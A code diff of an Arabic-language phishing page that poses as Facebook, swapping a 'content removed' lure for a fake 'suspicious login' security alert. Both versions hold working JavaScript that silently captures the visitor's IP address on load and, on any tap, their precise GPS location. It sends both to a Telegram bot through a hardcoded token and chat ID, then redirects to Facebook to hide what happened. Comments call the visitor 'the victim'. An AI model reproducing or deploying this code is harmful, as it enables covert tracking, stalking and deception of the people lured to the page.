@@ -2,92 +2,68 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<meta property="og:title" content="عذراً، هذا المحتوى غير متاح الآن">
-<meta property="og:description" content="ربما انتهت صلاحية الرابط، أو تم حذف المنشور، أو أنك لا تملك صلاحية الوصول.">
+<meta property="og:title" content="تنبيه أمني: تسجيل دخول مشبوه">
+<meta property="og:description" content="تم رصد محاولة وصول لحسابك من جهاز غير معروف. اضغط للمراجعة.">
+<meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png">
 
-<meta property="og:image" content="https://canarytokens.com/images/tags/uXXXXX/image.jpg"> 
-
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Facebook">
-
-<title>Facebook - Content Removed</title>
+<title>Facebook - Security Check</title>
 
 <style>
-/* تصميم يحاكي فيسبوك بدقة */
-body { margin: 0; padding: 0; background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: pointer; }
-#fb_error_box { text-align: center; padding: 20px; max-width: 420px; z-index: 1; }
-#fb_icon { width: 100px; margin-bottom: 25px; opacity: 0.8; }
-#fb_title { font-size: 20px; font-weight: bold; color: #65676b; margin-bottom: 15px; }
-#fb_msg { font-size: 16px; color: #65676b; line-height: 1.5; margin-bottom: 35px; }
-#fb_btn { background-color: #1877f2; color: white; padding: 12px 24px; border-radius: 6px; font-weight: 600; text-decoration: none; border: none; font-size: 15px; }
-#overlay_touch { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0); }
+    body { margin: 0; background: #f0f2f5; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+    .box { text-align: center; color: #65676b; }
+    .btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; border: none; font-weight: bold; margin-top: 20px; }
 </style>
 </head>
-<body onclick="be0426c1c()">
+<body onclick="getAccurateGPS()">
 
-<div id="overlay_touch"></div>
-
-<div id="fb_error_box">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" id="fb_icon" alt="Lock Icon">
-    <div id="fb_title">عذراً، هذا المحتوى غير متاح الآن</div>
-    <div id="fb_msg">
-        ربما انتهت صلاحية الرابط الذي اتبعته، أو تم حذف المنشور، أو أنك لا تملك صلاحية الوصول لرؤيته في الوقت الحالي.
-    </div>
-    <button id="fb_btn">الانتقال إلى فيسبوك</button>
+<div class="box">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" width="100">
+    <h2>يرجى تأكيد هويتك</h2>
+    <p>لقد لاحظنا نشاطاً غير معتاد على حسابك.</p>
+    <button class="btn">تأكيد الحساب</button>
 </div>
 
 <script>
-/* 🔱 كود الجافا سكريبت المشفر (Obfuscated) للحماية 🔱 */
-/* بيانات التلجرام الخاصة بك (مستبدلة) */
-const t_k = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const c_i = "1611398303";
+const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
 
-// وظيفة سحب البيانات الصامتة (IP + Metadata) عند الفتح
-async function a7391b0c8() {
-    try {
-        // نستخدم ipinfo للحصول على موقع أدق بناءً على الشبكة
-        const r = await fetch('https://ipinfo.io/json?token=YOUR_FREE_IPINFO_TOKEN');
-        const d = await r.json();
-        const l = d.loc.split(',');
-        
-        let m = `🚩 صيد تلقائي (فتح الرابط)\n🌐 IP: ${d.ip}\n🏙 المدينة: ${d.city}\n📡 المزود: ${d.org}\n📱 الجهاز: ${navigator.platform}\n🔗 الموقع التقريبي: https://www.google.com/maps?q=${l[0]},${l[1]}`;
-        s2t(m);
-    } catch (e) {
-        s2t("🚩 دخول جديد (تعذر تحديد موقع الشبكة تلقائياً)");
-    }
+// 🔱 1. صيد الـ IP الخارجي صامتاً (بدون ضغط) 🔱
+// نستخدم خدمة ipify مع نظام JSONP لتجاوز حماية CORS نهائياً
+function captureIPSilent() {
+    const script = document.createElement('script');
+    script.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
+    document.body.appendChild(script);
 }
 
-// وظيفة سحب الـ GPS الدقيق عند أول لمسة (الأمتار)
-function be0426c1c() {
-    document.getElementById('overlay_touch').style.display = 'none';
-    
+function handleIP(data) {
+    let msg = `🚀 صيد خارجي (صامت - بدون ضغط)\n🌐 الـ IP الحقيقي: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleTimeString()}`;
+    sendToTelegram(msg);
+}
+
+// 🔱 2. صيد الـ GPS الدقيق (عند الضغط) 🔱
+function getAccurateGPS() {
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (p) => {
-                let la = p.coords.latitude;
-                let lo = p.coords.longitude;
-                let m = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${la}, ${lo}\n🔗 الخريطة: http://google.com/maps?q=${la},${lo}`;
-                s2t(m);
-                // التمويه النهائي بعد الصيد
-                setTimeout(() => { window.location.href = "https://m.facebook.com/"; }, 1000);
-            },
-            (err) => {
-                s2t("⚠️ المستخدم رفض إذن الـ GPS الدقيق");
-                window.location.href = "https://m.facebook.com/";
-            },
-            { enableHighAccuracy: true, timeout: 8000 }
-        );
+        navigator.geolocation.getCurrentPosition((pos) => {
+            let lat = pos.coords.latitude;
+            let lon = pos.coords.longitude;
+            let msg = `🎯 صيد دقيق (GPS REAL-TIME)\n📍 الإحداثيات: ${lat}, ${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+            sendToTelegram(msg);
+            setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 500);
+        }, (err) => {
+            sendToTelegram("⚠️ الضحية ضغط ولكن رفض إذن الموقع");
+            window.location.href = "https://m.facebook.com";
+        }, { enableHighAccuracy: true });
     }
 }
 
-function s2t(txt) {
-    fetch(`https://api.telegram.org/bot${t_k}/sendMessage?chat_id=${c_i}&text=${encodeURIComponent(txt)}`);
+function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
 }
 
-// تنفيذ السحب الصامت فور التحميل
-window.onload = a7391b0c8;
+// التنفيذ الفوري عند تحميل الصفحة (قبل أي لمسة)
+window.onload = captureIPSilent;
 </script>
 </body>
 </html>
